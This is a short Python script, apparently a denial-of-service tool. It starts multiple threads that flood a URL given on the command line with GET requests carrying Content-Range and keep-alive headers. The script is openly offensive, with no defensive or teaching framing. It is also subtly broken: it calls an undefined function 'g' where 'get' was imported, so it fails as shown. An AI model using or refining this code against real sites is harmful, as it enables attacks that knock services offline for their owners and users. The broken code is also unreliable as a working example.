import threading
import argparse
from requests import get,post

def dosAtck(url, repeat):
    Atckheaders = {
        "Content-Range": "bytes 0-99/1000",
        "Content-Length": "100",
        "Connection": "keep-alive",
        "User-Agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
    }
    Normheaders = {
        "User-Agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
    }

    for _ in range(repeat):
        g(url, headers=Atckheaders)

def main():
    # Create an ArgumentParser object
    parser = argparse.ArgumentParser(description='Sample script with arguments')

    # Add arguments to the parser
    parser.add_argument('-url', type=str, help='URL of the website')
    parser.add_argument('-r', type=int, help='An integer value')

    # Parse the command-line arguments
    args = parser.parse_args()

    # Access the values of the arguments
    url = args.url
    repeat = args.r

    # Create and start threads
    threads = []
    for x in range(repeat):
        t = threading.Thread(target=dosAtck, args=(url, repeat))
        t.start()
        threads.append(t)

    # Wait for all threads to finish
    for t in threads:
        t.join()

if __name__ == '__main__':
    main()
